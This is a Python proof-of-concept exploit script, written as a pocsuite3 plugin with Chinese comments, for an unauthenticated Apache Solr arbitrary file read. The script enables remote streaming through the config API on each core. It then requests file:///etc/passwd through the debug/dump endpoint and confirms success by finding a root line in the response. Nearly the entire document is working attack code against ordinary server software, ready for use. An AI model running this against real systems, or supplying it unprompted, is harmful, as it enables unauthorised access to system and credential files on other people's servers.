#!/usr/bin/env python
#coding=utf-8

import random
import json
import time
import subprocess
import signal
import os
import sys
import base64
import re
from string import ascii_letters
import traceback
import socket
# 将输入的url转换为ip:port，供socket使用
from pocsuite3.lib.utils import url2ip
from pocsuite3.api import logger
from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


'''
CVE-2021-pending
据说是Solr官方拒绝修复的，截止2021/3/18是0 day
'''
class Solr_file_read_CVE_2021_pending(POCBase):
    vulID = 'solr-file-read-CVE-2021-pending'
    appName = 'Solr'
    appVersion = 'Apache Solr <= 8.8.1'
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.CODE_EXECUTION
    vulDate = '2021-03-17'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2021-03-17'  # 编写 PoC 的日期
    updateDate = '2021-03-17'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ']  # 漏洞地址来源,0day不用写
    name = 'Solr任意文件读取漏洞'  # PoC 名称
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"高危"


    def _verify(self):
        result={}

        vul_url = self.url
       
        host, port = url2ip(vul_url, True)

        logger.info("检查端口开放情况...")
        # 端口都不开放就不浪费时间了
        if not self.is_port_open(host, port):
            logger.info("端口不开放! 退出!")
            return

        logger.info("端口开放... 继续") 
 
        url_cores = vul_url + "/solr/admin/cores?wt=json"

        payload = {  "set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":"true"}}
        payload2= 'stream.url=file:///etc/passwd'

        flag = 'root:x:0:0'    # /etc/passwd的标志

        core_names = self.get_core_names(url_cores)
        logger.info(core_names)

        # 对每个core都发送一次请求
        for core_name in core_names:
            logger.info("当前core_name: " + core_name)
            config_url = '{0}/solr/{1}/config'.format(self.url, core_name)
            stream_url = '{0}/solr/{1}/debug/dump?param=ContentStreams'.format(self.url, core_name)
            target_url = config_url
    
            resp = None

            try:
                req.post(config_url, json=payload, timeout=5)
                #resp = req.post(stream_url, data=payload2,timeout=5)
                resp = req.post(stream_url, data={'stream.url': 'file:///etc/passwd'}, timeout=5)
            except Exception as e:
                logger.error(e)
                #continue
            
            
            logger.info(resp.status_code)
            if resp.status_code == 404:
                logger.info('Not Found!')
            elif flag in resp.text:
                file_content = resp.json()['streams'][0]['stream']
                logger.info(file_content)
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target_url
                result['VerifyInfo']['core'] = core_name
                result['VerifyInfo']['Payload'] = payload2
                result['VerifyInfo']['Response'] = file_content
                return self.save_output(result)
        
        return self.save_output(result)


    def is_port_open(self, p_host, p_port):
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sk.settimeout(2)
        try:
            sk.connect((p_host, p_port))
            print('Server port is OK!')
        except Exception as e:    # 碰到异常认为端口未开放，返回False
            return False
        
        sk.close()
        # 没问题就返回True
        return True


    ''' 拿到core的名字'''
    def get_core_name(self, p_url_cores):
        r = req.get(p_url_cores, verify=False, allow_redirects=False, timeout=5)
        
        if r.status_code == 200:
            if r.json()['status'] == "":    # 失败，退出
                self.save_output(result)
            else:
                a = list(r.json()['status'].keys())
        return a[0]


    ''' 拿到所有core的名字'''
    def get_core_names(self, p_url_cores):
        r = req.get(p_url_cores, verify=False, allow_redirects=False, timeout=5)
        
        if r.status_code == 200:
            if r.json()['status'] == "":    # 失败，退出
                self.save_output(result)
            else:
                a = list(r.json()['status'].keys())
        return a
     


    # 攻击模块
    def _attack(self):
        return self._verify()

    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


# 注册类
register_poc(Solr_file_read_CVE_2021_pending)
